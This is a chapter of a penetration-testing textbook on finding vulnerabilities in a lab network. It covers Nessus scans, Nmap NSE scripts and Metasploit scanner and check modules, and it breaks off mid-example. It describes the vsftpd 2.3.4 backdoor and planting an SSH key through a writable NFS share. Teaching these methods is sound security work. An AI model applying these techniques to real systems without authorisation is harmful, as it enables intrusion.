<html><head></head><body><section class="chapter" epub:type="chapter" id="finding_vulnerabilities" title="Chapter&#xA0;6.&#xA0;Finding Vulnerabilities"><div class="titlepage"><div><div><h2 class="title">Chapter 6. Finding Vulnerabilities</h2></div></div></div><p><a class="indexterm" id="iddle2365"/><a class="indexterm" id="iddle2402"/><a class="indexterm" id="iddle2405"/>Before we start slinging exploits, we need to do some more research and analysis. When identifying vulnerabilities, we actively search for issues that will lead to compromise in the exploitation phase. Although some security firms will just run an automated exploitation tool and hope for the best, careful study of the vulnerabilities by a skilled pentester will garner better results than any tool on its own.</p><p>We’ll examine several vulnerability analysis methods in this chapter, including automated scanning, targeted analysis, and manual research.</p><div class="sect1" title="From Nmap Version Scan to Potential Vulnerability"><div class="titlepage"><div><div><h2 class="title" id="from_nmap_version_scan_to_potential_vuln" style="clear: both">From Nmap Version Scan to Potential Vulnerability</h2></div></div></div><p>Now that we have some information about our target and the attack surface, we can develop scenarios to reach our pentest goals. For example, the FTP server on port 21 announced itself as Vsftpd 2.3.4. Vsftpd is short for Very Secure FTP.</p><p>We might assume that a product that calls itself <span class="emphasis"><em>very secure</em></span> is asking for trouble, and in fact, in July 2011, it came to light that the Vsftpd repository <a class="indexterm" id="iddle1795"/><a class="indexterm" id="iddle1802"/><a class="indexterm" id="iddle2288"/>had been breached. The Vsftpd binaries had been replaced with a backdoored version that could be triggered with a username containing a smiley face <code class="literal">:)</code>. This opens a root shell on port 6200. Once the issue was discovered, the backdoored binaries were removed, and the official Vsftpd 2.3.4 was put back in place. So, though the presence of Vsftpd 2.3.4 doesn’t guarantee that our target is vulnerable, it is definitely a threat to consider. Pentesting doesn’t get much easier than piggybacking on an attacker who already owns a system.</p></div><div class="sect1" title="Nessus"><div class="titlepage"><div><div><h2 class="title" id="nessus" style="clear: both">Nessus</h2></div></div></div><p>Tenable Security’s Nessus is one of the most widely used commercial vulnerability scanners, though many vendors provide comparable products. Nessus shares its name with a centaur who was slain by the Greek mythological hero, Heracles, and whose blood later killed Heracles himself. The Nessus database includes vulnerabilities across platforms and protocols, and its scanner performs a series of checks to detect known issues. You’ll find entire books and training courses devoted to Nessus, and as you become more familiar with the tool, you’ll find what works best for you. I’ll provide only a high-level discussion of Nessus here.</p><p>Nessus is available as a paid professional version that pentesters and in-house security teams can use to scan networks for vulnerabilities. You can use the free, noncommercial version called Nessus Home to try the exercises in this book. Nessus Home is limited to scanning 16 IP addresses. (Nessus isn’t preinstalled on Kali, but we covered installing it in <a class="xref" href="ch01.xhtml" title="Chapter 1. Setting Up Your Virtual Lab">Chapter 1</a>.)</p><p>Before you can run Nessus you need to start the Nessus daemon. To do so, enter the <code class="literal">service</code> command as shown here to start the Nessus web interface on TCP port 8834.</p><a id="pro_id00086"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>service nessusd start</strong></span></pre><p>Now open a web browser, and access Nessus by directing the Iceweasel browser to <span class="emphasis"><em>https://kali:8834</em></span>. (If you want to access the Nessus interface from another system, such as the host, you must replace <span class="emphasis"><em>kali</em></span> with the IP address of the Kali machine.) After a few minutes of initialization, you should see a login screen, shown in <a class="xref" href="ch06.xhtml#nessus_web_interface_login_screen" title="Figure 6-1. The Nessus web interface login screen">Figure 6-1</a>. Use the login credentials you created in <a class="xref" href="ch01.xhtml" title="Chapter 1. Setting Up Your Virtual Lab">Chapter 1</a>.</p><div class="sect2" title="Nessus Policies"><div class="titlepage"><div><div><h3 class="title" id="nessus_policies">Nessus Policies</h3></div></div></div><p>The Nessus web interface has several tabs at the top of the screen, as shown in <a class="xref" href="ch06.xhtml#nessus_policies-id00020" title="Figure 6-2. Nessus policies">Figure 6-2</a>. Let’s start with the Policies tab. Nessus policies are like configuration files that tell Nessus which vulnerability checks, port scanners, and so on to run in the vulnerability scan.</p><div class="figure"><a id="nessus_web_interface_login_screen"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00066"/><img alt="The Nessus web interface login screen" src="httpatomoreillycomsourcenostarchimages2030322.png.jpg"/></div></div><div class="figure-title">Figure 6-1. The Nessus web interface login screen</div></div><div class="figure"><a id="nessus_policies-id00020"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00067"/><img alt="Nessus policies" src="httpatomoreillycomsourcenostarchimages2030324.png.jpg"/></div></div><div class="figure-title">Figure 6-2. Nessus policies</div></div><p><a class="indexterm" id="iddle1801"/>To create a policy, click <span class="strong"><strong>New Policy</strong></span> at the left of the Nessus interface. Nessus’s policy wizards will help you create a policy that will be useful for your scanning goals, as shown in <a class="xref" href="ch06.xhtml#nessus_policy_wizards" title="Figure 6-3. Nessus policy wizards">Figure 6-3</a>. For our simple example, choose <span class="strong"><strong>Basic Network Scan</strong></span>.</p><div class="figure"><a id="nessus_policy_wizards"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00068"/><img alt="Nessus policy wizards" src="httpatomoreillycomsourcenostarchimages2030326.png.jpg"/></div></div><div class="figure-title">Figure 6-3. Nessus policy wizards</div></div><p>Now you are prompted for some basic information about the policy, as shown in <a class="xref" href="ch06.xhtml#basic_policy_setup" title="Figure 6-4. Basic policy setup">Figure 6-4</a>, including a name, a description, and whether other Nessus users can access the policy. Once you are done, click <span class="strong"><strong>Next</strong></span>.</p><div class="figure"><a id="basic_policy_setup"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00069"/><img alt="Basic policy setup" src="httpatomoreillycomsourcenostarchimages2030328.png.jpg"/></div></div><div class="figure-title">Figure 6-4. Basic policy setup</div></div><p>Now you are asked if this is an internal or external scan, as shown in <a class="xref" href="ch06.xhtml#internal_or_external_scan" title="Figure 6-5. Internal or external scan">Figure 6-5</a>. Choose <span class="strong"><strong>Internal</strong></span> and click <span class="strong"><strong>Next</strong></span>.</p><div class="figure"><a id="internal_or_external_scan"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00070"/><img alt="Internal or external scan" src="httpatomoreillycomsourcenostarchimages2030330.png.jpg"/></div></div><div class="figure-title">Figure 6-5. Internal or external scan</div></div><p><a class="indexterm" id="iddle1224"/><a class="indexterm" id="iddle1796"/>If you have credentials, Nessus can authenticate with hosts and look for vulnerabilities that may not be apparent from a network-facing perspective. This feature is often used by internal security teams to test the security posture of their networks. You can set these credentials in the next step, as shown in <a class="xref" href="ch06.xhtml#adding_credentials_left_parenthesisoptio" title="Figure 6-6. Adding credentials (optional)">Figure 6-6</a>. For now, you can leave this step blank and click <span class="strong"><strong>Save</strong></span>.</p><div class="figure"><a id="adding_credentials_left_parenthesisoptio"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00071"/><img alt="Adding credentials (optional)" src="httpatomoreillycomsourcenostarchimages2030332.png.jpg"/></div></div><div class="figure-title">Figure 6-6. Adding credentials (optional)</div></div><p>As shown in <a class="xref" href="ch06.xhtml#our_policy_is_addeddot" title="Figure 6-7. Our policy is added.">Figure 6-7</a>, our new policy is now shown in the Policy tab.</p><div class="figure"><a id="our_policy_is_addeddot"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00072"/><img alt="Our policy is added." src="httpatomoreillycomsourcenostarchimages2030334.png.jpg"/></div></div><div class="figure-title">Figure 6-7. Our policy is added.</div></div></div><div class="sect2" title="Scanning with Nessus"><div class="titlepage"><div><div><h3 class="title" id="scanning_with_nessus">Scanning with Nessus</h3></div></div></div><p><a class="indexterm" id="iddle1804"/>Now, let’s switch to the Scans tab and run Nessus against our target machines. Click <span class="strong"><strong>Scans</strong></span> ▸ <span class="strong"><strong>New Scan</strong></span>, and fill in the scan information, as shown in <a class="xref" href="ch06.xhtml#starting_a_nessus_scan" title="Figure 6-8. Starting a Nessus scan">Figure 6-8</a>. Nessus needs to know the name for our scan (Name), which scan policy to use (Policy), and which systems to scan (Targets).</p><div class="figure"><a id="starting_a_nessus_scan"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00073"/><img alt="Starting a Nessus scan" src="httpatomoreillycomsourcenostarchimages2030336.png.jpg"/></div></div><div class="figure-title">Figure 6-8. Starting a Nessus scan</div></div><p><a class="indexterm" id="iddle2489"/>Nessus runs a series of probes against the target in an attempt to detect or rule out as many issues as possible. The running scan is added to the Scans tab as shown in <a class="xref" href="ch06.xhtml#running_a_nessus_scan" title="Figure 6-9. Running a Nessus scan">Figure 6-9</a>.</p><div class="figure"><a id="running_a_nessus_scan"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00074"/><img alt="Running a Nessus scan" src="httpatomoreillycomsourcenostarchimages2030338.png.jpg"/></div></div><div class="figure-title">Figure 6-9. Running a Nessus scan</div></div><p>Once the scan is finished, click it to view the results, as shown in <a class="xref" href="ch06.xhtml#high-level_overview_of_the_results" title="Figure 6-10. High-level overview of the results">Figure 6-10</a>.</p><div class="figure"><a id="high-level_overview_of_the_results"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00075"/><img alt="High-level overview of the results" src="httpatomoreillycomsourcenostarchimages2030340.png.jpg"/></div></div><div class="figure-title">Figure 6-10. High-level overview of the results</div></div><p>As shown in the figure, Nessus found several critical vulnerabilities on the Windows XP and Ubuntu targets. But it found only informational data on the Windows 7 box.</p><p>To see details of a specific host, click it. Details of the Windows XP vulnerabilities are shown in <a class="xref" href="ch06.xhtml#nessus_categorizes_and_describes_its_res" title="Figure 6-11. Nessus categorizes and describes its results.">Figure 6-11</a>.</p><div class="figure"><a id="nessus_categorizes_and_describes_its_res"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00076"/><img alt="Nessus categorizes and describes its results." src="httpatomoreillycomsourcenostarchimages2030342.png.jpg"/></div></div><div class="figure-title">Figure 6-11. Nessus categorizes and describes its results.</div></div><p><a class="indexterm" id="iddle1196"/><a class="indexterm" id="iddle1241"/><a class="indexterm" id="iddle1797"/><a class="indexterm" id="iddle1803"/>Say what you want about vulnerability scanners, but it’s hard to find a product that can tell you as much about a target environment as quickly and with as little effort as Nessus. For example, Nessus’s results reveal that our Windows XP target is in fact missing the MS08-067 patch discussed in <a class="xref" href="ch04.xhtml" title="Chapter 4. Using the Metasploit Framework">Chapter 4</a>. It also seems to be missing other Microsoft patches affecting the SMB server.</p><p>Which vulnerability is the most exploitable? The Nessus output for a particular issue will often give you some information about that issue’s potential exploitability. For example, clicking the MS08-067 vulnerability in the output (<a class="xref" href="ch06.xhtml#ms08-067_nessus_entry_provides_detailed" title="Figure 6-12. The MS08-067 Nessus entry provides detailed information.">Figure 6-12</a>) shows exploit code available for this vulnerability in Metasploit as well as other tools such as Core Impact and Canvas.</p><div class="figure"><a id="ms08-067_nessus_entry_provides_detailed"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00077"/><img alt="The MS08-067 Nessus entry provides detailed information." src="httpatomoreillycomsourcenostarchimages2030344.png.jpg"/></div></div><div class="figure-title">Figure 6-12. The MS08-067 Nessus entry provides detailed information.</div></div></div><div class="sect2" title="A Note About Nessus Rankings"><div class="titlepage"><div><div><h3 class="title" id="note_about_nessus_rankings">A Note About Nessus Rankings</h3></div></div></div><p>Nessus ranks vulnerabilities based on the Common Vulnerability Scoring System (CVSS), version 2, from the National Institute of Standards and <a class="indexterm" id="iddle1792"/><a class="indexterm" id="iddle1798"/><a class="indexterm" id="iddle1835"/><a class="indexterm" id="iddle2415"/>Technology (NIST). Ranking is calculated based on the impact to the system if the issue is exploited. Though the higher the vulnerability ranking, the more serious Nessus thinks the vulnerability issue is, the actual risk of a vulnerability depends on the environment. For example, Nessus ranks anonymous FTP access as a medium-risk vulnerability. When restricted to nonsensitive files, however, anonymous FTP access can have a low to nonexistent risk. On the other hand, it isn’t unheard of for companies to leave copies of their proprietary source code lying around on a publicly available FTP server. If on an external pentesting engagement you can access the client’s biggest asset by logging in as <span class="emphasis"><em>anonymous</em></span> on an FTP server, it’s safe to assume that any interested attacker can do the same, and this warrants an immediate call to your client contact. Tools are not capable of making this sort of distinction. For that you need a pentester.</p></div><div class="sect2" title="Why Use Vulnerability Scanners?"><div class="titlepage"><div><div><h3 class="title" id="why_use_vulnerability_scannersquestion_m">Why Use Vulnerability Scanners?</h3></div></div></div><p>Though some penetration testing courses leave out vulnerability scanning altogether and argue that a skilled pentester can find everything a scanner can, scanners are still valuable tools, especially because many pentests are performed within a shorter time window than anyone might like. But if one of the goals of your assessment is to avoid detection, you might think twice about using a loud vulnerability scanner.</p><p>Though Nessus did not find every issue in our environment, its use, combined with the results of our information-gathering phase, has given us a solid starting point for exploitation. Even those pentesters who think that a pentester should replace a scanner during an engagement can benefit from knowing how to use scanning tools. Though in an ideal world, every company would perform regular, no-holds-barred pentests, in reality, there is plenty of vulnerability scanning work to go around.</p></div><div class="sect2" title="Exporting Nessus Results"><div class="titlepage"><div><div><h3 class="title" id="exporting_nessus_results">Exporting Nessus Results</h3></div></div></div><p>Once a Nessus scan finishes, you can export its findings from the Export button at the top of the scan details screen, as shown in <a class="xref" href="ch06.xhtml#exporting_nessus_scan_results" title="Figure 6-13. Exporting Nessus scan results">Figure 6-13</a>.</p><div class="figure"><a id="exporting_nessus_scan_results"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00078"/><img alt="Exporting Nessus scan results" src="httpatomoreillycomsourcenostarchimages2030346.png.jpg"/></div></div><div class="figure-title">Figure 6-13. Exporting Nessus scan results</div></div><p><a class="indexterm" id="iddle1195"/><a class="indexterm" id="iddle1239"/><a class="indexterm" id="iddle1449"/><a class="indexterm" id="iddle1843"/><a class="indexterm" id="iddle1848"/><a class="indexterm" id="iddle2013"/><a class="indexterm" id="iddle2063"/><a class="indexterm" id="iddle2408"/>Nessus can output results into PDF, HTML, XML, CSV, and other formats. You may want to hand off the raw results to your client for a vulnerability scanning engagement, but you should never export scanner results, slap your company letterhead on them, and call them pentest results. Much more analysis is involved in a penetration test than a vulnerability scan. You should always verify results from automated scanners and combine them with manual analysis to get a more complete picture of the vulnerabilities in the environment.</p><p>Now for a look at some other methods of vulnerability analysis.</p></div><div class="sect2" title="Researching Vulnerabilities"><div class="titlepage"><div><div><h3 class="title" id="researching_vulnerabilities">Researching Vulnerabilities</h3></div></div></div><p>If the Nessus summary page doesn’t give you enough information about a vulnerability, try a good old-fashioned Google search. Additionally, try searching <span class="emphasis"><em><a class="ulink" href="http://www.securityfocus.com/" target="_top">http://www.securityfocus.com/</a></em></span>, <span class="emphasis"><em><a class="ulink" href="http://www.packetstormsecurity.org/" target="_top">http://www.packetstormsecurity.org/</a></em></span>, <span class="emphasis"><em><a class="ulink" href="http://www.exploit-db.org/" target="_top">http://www.exploit-db.org/</a></em></span>, and <span class="emphasis"><em><a class="ulink" href="http://www.cve.mitre.org/" target="_top">http://www.cve.mitre.org/</a></em></span>. For -example, you can search for vulnerabilities using the Common Vulnerabilities and Exposures (CVE) system, Microsoft patch number, and so on within a specific site using a Google query such as “ms08-067 site:securityfocus.com”. The MS08-067 vulnerability received a lot of attention, so you’ll find no shortage of good information. (We looked at the details of this particular issue in <a class="xref" href="ch04.xhtml" title="Chapter 4. Using the Metasploit Framework">Chapter 4</a>.)</p><p>Depending on your subject vulnerability, you may be able to find proof-of-concept exploit code online as well. We’ll look at working with public code in <a class="xref" href="ch19.xhtml" title="Chapter 19. Fuzzing, Porting Exploits, and Metasploit Modules">Chapter 19</a>, but be warned that unlike the community-vetted exploits in a project such as Metasploit, not all code on the Internet does what it claims. The payload in a public exploit may destroy the target machine, or it may join your machine to the exploit author’s secret botnet. Be vigilant when working with public exploits, and carefully vet them before running them against a production network. (You may also be able to find in-depth information about some vulnerabilities posted by the researchers who originally found the issue.)</p></div></div><div class="sect1" title="The Nmap Scripting Engine"><div class="titlepage"><div><div><h2 class="title" id="nmap_scripting_engine" style="clear: both">The Nmap Scripting Engine</h2></div></div></div><p>Now for another tool that provides vulnerability scanning. Just as Metasploit evolved from an exploitation framework into a fully fledged penetration-testing suite with hundreds of modules, Nmap has similarly evolved beyond its original goal of port scanning. The Nmap Scripting Engine (NSE) lets you run publicly available scripts and write your own.</p><p>You’ll find the scripts packaged with the NSE in Kali at <span class="emphasis"><em>/usr/share/nmap/scripts</em></span>. The available scripts fall into several categories, including information gathering, active vulnerability assessment, searches for signs of previous compromises, and so on. <a class="xref" href="ch06.xhtml#nmap_scripts_list" title="Example 6-1. Nmap scripts list">Example 6-1</a> shows NSE scripts available in your default Kali installation.</p><div class="example"><a id="nmap_scripts_list"/><div class="example-title">Example 6-1. Nmap scripts list</div><div class="example-contents"><pre class="programlisting">root@kali:~# <span class="strong"><strong>cd /usr/share/nmap/scripts</strong></span>&#13;
root@kali:/usr/local/share/nmap/scripts# <span class="strong"><strong>ls</strong></span>&#13;
acarsd-info.nse                         ip-geolocation-geobytes.nse&#13;
address-info.nse                        ip-geolocation-geoplugin.nse&#13;
afp-brute.nse                           ip-geolocation-ipinfodb.nse&#13;
afp-ls.nse                              ip-geolocation-maxmind.nse&#13;
--<span class="emphasis"><em>snip</em></span>--</pre></div></div><p><a class="indexterm" id="iddle1844"/>To get more information about a particular script or category of scripts, enter the <code class="literal">--script-help</code> flag in Nmap. For example, to see all scripts in the <span class="emphasis"><em>default</em></span> category enter <span class="strong"><strong><code class="literal">nmap --script-help default</code></strong></span>, as shown in <a class="xref" href="ch06.xhtml#nmap_default_scripts_help" title="Example 6-2. Nmap default scripts help">Example 6-2</a>. Many factors contribute to whether a script is included in the default category, including its reliability and whether the script is safe and unlikely to harm the target.</p><div class="example"><a id="nmap_default_scripts_help"/><div class="example-title">Example 6-2. Nmap default scripts help</div><div class="example-contents"><pre class="programlisting">root@kali:~# <span class="strong"><strong>nmap --script-help default</strong></span>&#13;
Starting Nmap 6.40 ( http://nmap.org ) at 2015-07-16 14:43 EDT&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
ftp-anon&#13;
Categories: default auth safe&#13;
http://nmap.org/nsedoc/scripts/ftp-anon.html&#13;
  Checks if an FTP server allows anonymous logins.&#13;
&#13;
  If anonymous is allowed, gets a directory listing of the root directory and highlights writeable files.&#13;
--<span class="emphasis"><em>snip</em></span>--</pre></div></div><p>If you use the <code class="literal">-sC</code> flag to tell Nmap to run a script scan in addition to port scanning, it will run all the scripts in the <span class="emphasis"><em>default</em></span> category, as shown in <a class="xref" href="ch06.xhtml#nmap_default_scripts_output" title="Example 6-3. Nmap default scripts output">Example 6-3</a>.</p><div class="example"><a id="nmap_default_scripts_output"/><div class="example-title">Example 6-3. Nmap default scripts output</div><div class="example-contents"><pre class="programlisting">root@kali:~# <span class="strong"><strong>nmap -sC 192.168.20.10-12</strong></span>&#13;
&#13;
Starting Nmap 6.40 ( http://nmap.org ) at 2015-12-30 20:21 EST&#13;
Nmap scan report for 192.168.20.10&#13;
Host is up (0.00038s latency).&#13;
Not shown: 988 closed ports&#13;
PORT     STATE SERVICE&#13;
21/tcp   open  ftp&#13;
| ftp-anon: Anonymous FTP login allowed (FTP code 230)&#13;
| drwxr-xr-x 1 ftp ftp              0 Aug 06  2009 incoming&#13;
|_-r--r--r-- 1 ftp ftp            187 Aug 06  2009 onefile.html&#13;
|_ftp-bounce: bounce working!&#13;
25/tcp   open  smtp&#13;
| smtp-commands: georgia.com, SIZE 100000000, SEND, SOML, SAML, HELP, VRFY❶, EXPN, ETRN, XTRN,&#13;
|_ This server supports the following commands. HELO MAIL RCPT DATA RSET SEND SOML SAML HELP NOOP QUIT&#13;
79/tcp   open  finger&#13;
|_finger: Finger online user list request denied.&#13;
80/tcp   open  http&#13;
|_http-methods: No Allow or Public header in OPTIONS response (status code 302)&#13;
| http-title:             XAMPP            1.7.2 ❷&#13;
|_Requested resource was http://192.168.20.10/xampp/splash.php&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
3306/tcp open  mysql&#13;
| mysql-info: MySQL Error detected!&#13;
| Error Code was: 1130&#13;
|_Host '192.168.20.9' is not allowed to connect to this MySQL server ❸&#13;
--<span class="emphasis"><em>snip</em></span>--</pre></div></div><p><a class="indexterm" id="iddle1826"/><a class="indexterm" id="iddle1832"/><a class="indexterm" id="iddle1845"/>As you can see, the Nmap Scripting Engine found a good deal of interesting information. For example, we see that the SMTP server on port 25 of the Windows XP target allows the use of the <code class="literal">VRFY</code> ❶ command, which allows us to see if a username exists on the mail server. If we have a valid username, use of this command will make credential-guessing attacks much more likely to succeed.</p><p>We can also see that the web server on port 80 appears to be an XAMPP 1.7.2 install ❷. As of this writing, the current stable version of XAMPP for Windows is 1.8.3. At the very least, the version we found is out of date, and it may also be subject to security issues.</p><p>In addition to showing us potential vulnerabilities, NSE also allows us to rule out some services. For example, we can see that the MySQL server on port 3306 does not allow us to connect because our IP address is not authorized ❸. We may want to return to this port during post exploitation if we are able to compromise other hosts in the environment, but for now we can rule out MySQL vulnerabilities on this host.</p></div><div class="sect1" title="Running a Single NSE Script"><div class="titlepage"><div><div><h2 class="title" id="running_a_single_nse_script" style="clear: both">Running a Single NSE Script</h2></div></div></div><p>Before we move on, let’s look at another example of using an NSE script, this time one that is not part of the default set. From our basic use of Nmap in the previous chapter, we know that our Linux target is running Network File System (NFS). NFS allows client computers to access local files over the network, but in your pentesting career, you may find that setting up NFS securely is easier said than done. Many users don’t think about the security consequences of giving remote users access to their files. What’s the worst that can happen, right? Who cares if I share my home directory with my coworkers?</p><p>The NSE script <span class="emphasis"><em>nfs-ls.nse</em></span> will connect to NFS and audit shares. We can see more information about an individual script with the <code class="literal">--script-help</code> command, as shown in <a class="xref" href="ch06.xhtml#nmap_nfs-ls_script_details" title="Example 6-4. Nmap NFS-LS script details">Example 6-4</a>.</p><div class="example"><a id="nmap_nfs-ls_script_details"/><div class="example-title">Example 6-4. Nmap NFS-LS script details</div><div class="example-contents"><pre class="programlisting">root@kali:~# <span class="strong"><strong>nmap --script-help nfs-ls</strong></span>&#13;
Starting Nmap 6.40 ( http://nmap.org ) at 2015-07-16 14:49 EDT&#13;
&#13;
nfs-ls&#13;
Categories: discovery safe&#13;
http://nmap.org/nsedoc/scripts/nfs-ls.html&#13;
  Attempts to get useful information about files from NFS exports.&#13;
  The output is intended to resemble the output of &lt;code&gt;ls&lt;/code&gt;.&#13;
--<span class="emphasis"><em>snip</em></span>--</pre></div></div><p><a class="indexterm" id="iddle2217"/>This script mounts the remote shares, audits their permissions, and lists the files included in the share. To run a script against our Linux target, we call it using the <code class="literal">--script</code> option and the script name, as shown in <a class="xref" href="ch06.xhtml#nmap_nfs-ls_scripts_output" title="Example 6-5. Nmap NFS-LS scripts output">Example 6-5</a>.</p><div class="example"><a id="nmap_nfs-ls_scripts_output"/><div class="example-title">Example 6-5. Nmap NFS-LS scripts output</div><div class="example-contents"><pre class="programlisting">root@kali:/# <span class="strong"><strong>nmap --script=nfs-ls 192.168.20.11</strong></span>&#13;
&#13;
Starting Nmap 6.40 ( http://nmap.org ) at 2015-12-28 22:02 EST&#13;
Nmap scan report for 192.168.20.11&#13;
Host is up (0.00040s latency).&#13;
Not shown: 993 closed ports&#13;
PORT     STATE SERVICE     VERSION&#13;
21/tcp   open  ftp         vsftpd 2.3.4&#13;
22/tcp   open  ssh         OpenSSH 5.1p1 Debian 3ubuntu1 (Ubuntu Linux; protocol 2.0)&#13;
80/tcp   open  http        Apache httpd 2.2.9 ((Ubuntu) PHP/5.2.6-2ubuntu4.6 with Suhosin-Patch)&#13;
111/tcp  open  rpcbind     2 (RPC #100000)&#13;
| nfs-ls:&#13;
|   Arguments:&#13;
|     maxfiles: 10 (file listing output limited)&#13;
|&#13;
|   NFS Export: /export/georgia❶&#13;
|   NFS Access: Read Lookup Modify  Extend Delete NoExecute&#13;
|     PERMISSION  UID   GID   SIZE  MODIFICATION TIME  FILENAME&#13;
|     drwxr-xr-x  1000  1000  4096  2013-12-28 23:35   /export/georgia&#13;
|     -rw-------  1000  1000  117   2013-12-26 03:41   .Xauthority&#13;
|     -rw-------  1000  1000  3645  2013-12-28 21:54   .bash_history&#13;
|     drwxr-xr-x  1000  1000  4096  2013-10-27 03:11   .cache&#13;
|     -rw-------  1000  1000  16    2013-10-27 03:11   .esd_auth&#13;
|     drwx------  1000  1000  4096  2013-10-27 03:11   .gnupg&#13;
|     ??????????  ?     ?     ?     ?                  .gvfs&#13;
|     -rw-------  1000  1000  864   2013-12-15 19:03   .recently-used.xbel&#13;
|     drwx------  1000  1000  4096  2013-12-15 23:38   .ssh❷&#13;
--<span class="emphasis"><em>snip</em></span>--</pre></div></div><p>As you can see, the NSE script found the NFS share <span class="emphasis"><em>/export/georgia</em></span> ❶ on our Linux target. Of particular interest is the <span class="emphasis"><em>.ssh</em></span> directory ❷, which may include sensitive information such as SSH keys and (if public key authentication is allowed on the SSH server) a list of authorized keys.</p><p>When you run into an access-control mistake like this, one common pen-test trick is to use the mistake and the write permission to add a new SSH <a class="indexterm" id="iddle1422"/><a class="indexterm" id="iddle1695"/>key to the <span class="emphasis"><em>authorized_keys</em></span> list (in this case, ours). If that attempt succeeds, suddenly the seemingly minor issue of being able to edit a user’s documents turns into the ability to log in to the remote system and execute commands.</p><p>Before we move on, let’s ensure that public key SSH authentication is enabled on our Linux target, allowing the attack we envisioned above to work successfully. Key-based login is considered the strongest form of SSH authentication and is recommended for security. A quick SSH attempt to our Linux target shows that public key authentication is allowed here ❶ (see <a class="xref" href="ch06.xhtml#ssh_authentication_methods" title="Example 6-6. SSH authentication methods">Example 6-6</a>).</p><div class="example"><a id="ssh_authentication_methods"/><div class="example-title">Example 6-6. SSH authentication methods</div><div class="example-contents"><pre class="programlisting">root@kali:/# <span class="strong"><strong>ssh 192.168.20.11</strong></span>&#13;
The authenticity of host '192.168.20.11 (192.168.20.11)' can't be established.&#13;
RSA key fingerprint is ab:d7:b0:df:21:ab:5c:24:8b:92:fe:b2:4f:ef:9c:21.&#13;
Are you sure you want to continue connecting (yes/no)? yes&#13;
Warning: Permanently added '192.168.20.11' (RSA) to the list of known hosts.&#13;
root@192.168.20.11's password:&#13;
Permission denied (publickey❶,password).</pre></div></div><div class="note" title="Note"><h3 class="title"><a id="ch06note01"/>Note</h3><p>Some NSE scripts may crash services or harm the target system, and an entire category is dedicated to denial of service. For example, the script <span class="emphasis"><em>smb-check-vulns</em></span> will check for the MS08-067 vulnerability and other SMB vulnerabilities. Its help information notes that this script is likely dangerous and shouldn’t be run on production systems unless you are prepared for the server to go down.</p></div></div><div class="sect1" title="Metasploit Scanner Modules"><div class="titlepage"><div><div><h2 class="title" id="metasploit_scanner_modules" style="clear: both">Metasploit Scanner Modules</h2></div></div></div><p>Metasploit, which we used in <a class="xref" href="ch04.xhtml" title="Chapter 4. Using the Metasploit Framework">Chapter 4</a>, also can conduct vulnerability scanning via numerous auxiliary modules. Unlike exploits, these modules will not give us control of the target machine, but they will help us identify vulnerabilities for later exploitation.</p><p>One such Metasploit module looks for FTP services that provide anonymous access. Although it may be easy enough to attempt to log in manually to individual FTP servers, Metasploit auxiliary modules let us scan many hosts at once, which will save time when you’re testing a large environment.</p><p>To choose a particular module, we <code class="literal">use</code> the module, then we define our targets with <code class="literal">set</code>, and then scan with the <code class="literal">exploit</code> command, as shown in <a class="xref" href="ch06.xhtml#metasploit_anonymous_ftp_scanner_module" title="Example 6-7. Metasploit anonymous FTP scanner module">Example 6-7</a>. This syntax should be familiar from <a class="xref" href="ch04.xhtml" title="Chapter 4. Using the Metasploit Framework">Chapter 4</a>.</p><div class="example"><a id="metasploit_anonymous_ftp_scanner_module"/><div class="example-title">Example 6-7. Metasploit anonymous FTP scanner module</div><div class="example-contents"><pre class="programlisting">msf &gt; <span class="strong"><strong>use scanner/ftp/anonymous</strong></span>&#13;
&#13;
msf  auxiliary(anonymous) &gt; <span class="strong"><strong>set RHOSTS 192.168.20.10-11</strong></span>&#13;
RHOSTS =&gt; 192.168.20.10-11&#13;
msf  auxiliary(anonymous) &gt; <span class="strong"><strong>exploit</strong></span>&#13;
&#13;
[*] 192.168.20.10:21 Anonymous READ (220-FileZilla Server version 0.9.32 beta&#13;
220-written by Tim Kosse (Tim.Kosse@gmx.de) ❶&#13;
220 Please visit http://sourceforge.net/projects/filezilla/)&#13;
[*] Scanned 1 of 2 hosts (050% complete)&#13;
[*] 192.168.20.11:21 Anonymous READ (220 (vsFTPd 2.3.4)) ❶&#13;
[*] Scanned 2 of 2 hosts (100% complete)&#13;
[*] Auxiliary module execution completed&#13;
msf  auxiliary(anonymous) &gt;</pre></div></div><p><a class="indexterm" id="iddle1176"/><a class="indexterm" id="iddle1685"/>At ❶, we find that both the Windows XP and Linux targets have anonymous FTP enabled. We know this may or may not be a serious issue, based on the files that are available to the anonymous user in the FTP folder. I’ve been on engagements where company trade secrets were sitting on an Internet-facing FTP server. On the other hand, I’ve also been on engagements where the use of anonymous FTP was justified from a business perspective, and no sensitive files were present. It is up to a pentester to fill in the information an automated scanner lacks as to the severity of an issue in a particular environment.</p></div><div class="sect1" title="Metasploit Exploit Check Functions"><div class="titlepage"><div><div><h2 class="title" id="metasploit_exploit_check_functions" style="clear: both">Metasploit Exploit Check Functions</h2></div></div></div><p>Some Metasploit exploits include a <code class="literal">check</code> function that connects to a target to see if it is vulnerable, rather than attempting to exploit a vulnerability. We can use this command as a kind of ad hoc vulnerability scan, as shown in <a class="xref" href="ch06.xhtml#ms08-067_check_function" title="Example 6-8. MS08-067 check function">Example 6-8</a>. (There’s no need to specify a payload when running <code class="literal">check</code> because no exploitation will take place.)</p><div class="example"><a id="ms08-067_check_function"/><div class="example-title">Example 6-8. MS08-067 check function</div><div class="example-contents"><pre class="programlisting">msf &gt; <span class="strong"><strong>use windows/smb/ms08_067_netapi</strong></span>&#13;
&#13;
msf  exploit(ms08_067_netapi) &gt; <span class="strong"><strong>set RHOST 192.168.20.10</strong></span>&#13;
RHOST =&gt; 192.168.20.10&#13;
msf  exploit(ms08_067_netapi) &gt; <span class="strong"><strong>check</strong></span>❶&#13;
&#13;
